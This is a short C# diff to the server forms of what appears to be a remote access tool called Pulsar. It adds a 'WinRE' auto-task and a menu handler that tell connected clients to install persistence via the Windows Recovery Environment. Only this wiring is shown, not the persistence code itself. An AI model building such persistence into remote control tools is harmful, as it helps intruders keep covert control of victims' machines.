@@ -608,6 +608,9 @@ namespace Pulsar.Server.Forms
                             Icon = "None"
                         });
                         break;
+                    case "WinRE":
+                        client.Send(new DoAddWinREPersistence { });
+                        break;
                 }
             }
         }
@@ -2118,6 +2121,11 @@ namespace Pulsar.Server.Forms
                     MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
+        }
+
+        private void winREToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            AddTask("WinRE", "", "");
         }
     }
 
